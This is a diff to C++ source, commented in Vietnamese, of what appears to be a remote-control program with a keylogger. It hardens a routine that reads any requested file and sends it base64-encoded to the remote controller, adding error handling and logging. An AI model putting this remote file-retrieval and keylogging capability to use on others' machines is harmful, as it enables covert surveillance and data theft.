@@ -55,6 +55,8 @@ void stopKeyLogger();
 
 static string toUtf8(const char *str)
 {
+    if (!str)
+        return string();
     return string(str);
 }
 
@@ -1073,37 +1075,69 @@ void fileManagement()
             string filePath;
             receiveSignal(filePath);
 
+            cout << "[FILE DOWNLOAD] Request: " << filePath << endl;
+
             // Đọc file
-            ifstream file(filePath, ios::binary);
+            ifstream file(filePath, ios::binary | ios::ate);
             if (file.is_open())
             {
-                // Đọc toàn bộ nội dung
-                file.seekg(0, ios::end);
+                // Lấy kích thước file
                 size_t fileSize = file.tellg();
                 file.seekg(0, ios::beg);
 
-                vector<char> buffer(fileSize);
-                file.read(buffer.data(), fileSize);
-                file.close();
+                cout << "[FILE DOWNLOAD] Size: " << fileSize << " bytes" << endl;
 
-                // Mã hóa Base64 (dùng CryptBinaryToStringA)
-                DWORD base64Size = 0;
-                CryptBinaryToStringA((BYTE *)buffer.data(), fileSize,
-                                     CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
-                                     NULL, &base64Size);
+                if (fileSize == 0)
+                {
+                    sendLine("ERROR: File is empty");
+                    file.close();
+                }
+                else
+                {
+                    vector<char> buffer(fileSize);
+                    file.read(buffer.data(), fileSize);
+                    file.close();
 
-                vector<char> base64(base64Size);
-                CryptBinaryToStringA((BYTE *)buffer.data(), fileSize,
-                                     CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
-                                     base64.data(), &base64Size);
+                    cout << "[FILE DOWNLOAD] Read complete, encoding..." << endl;
 
-                // Gửi header + data
-                sendLine("FILEDATA " + to_string(fileSize));
-                string b64str(base64.data());
-                sendLine(b64str);
+                    // Mã hóa Base64 (dùng CryptBinaryToStringA)
+                    DWORD base64Size = 0;
+                    if (!CryptBinaryToStringA((BYTE *)buffer.data(), fileSize,
+                                              CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
+                                              NULL, &base64Size))
+                    {
+                        sendLine("ERROR: Base64 size calculation failed");
+                        cout << "[FILE DOWNLOAD] Base64 calculation error" << endl;
+                    }
+                    else
+                    {
+                        // Cấp phát đủ chỗ cho base64 string
+                        vector<char> base64(base64Size);
+                        if (!CryptBinaryToStringA((BYTE *)buffer.data(), fileSize,
+                                                  CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
+                                                  base64.data(), &base64Size))
+                        {
+                            sendLine("ERROR: Base64 encoding failed");
+                            cout << "[FILE DOWNLOAD] Base64 encoding error" << endl;
+                        }
+                        else
+                        {
+                            cout << "[FILE DOWNLOAD] Encoded size: " << base64Size << " chars" << endl;
+
+                            // Gửi header + data
+                            sendLine("FILEDATA " + to_string(fileSize));
+                            // CryptBinaryToStringA trả về base64Size ĐÃ KHÔNG BAO GỒM null terminator
+                            string b64str(base64.data(), base64Size);
+                            sendLine(b64str);
+
+                            cout << "[FILE DOWNLOAD] Sent successfully" << endl;
+                        }
+                    }
+                }
             }
             else
             {
+                cout << "[FILE DOWNLOAD] Cannot open file: " << filePath << endl;
                 sendLine("ERROR: Cannot open file");
             }
         }
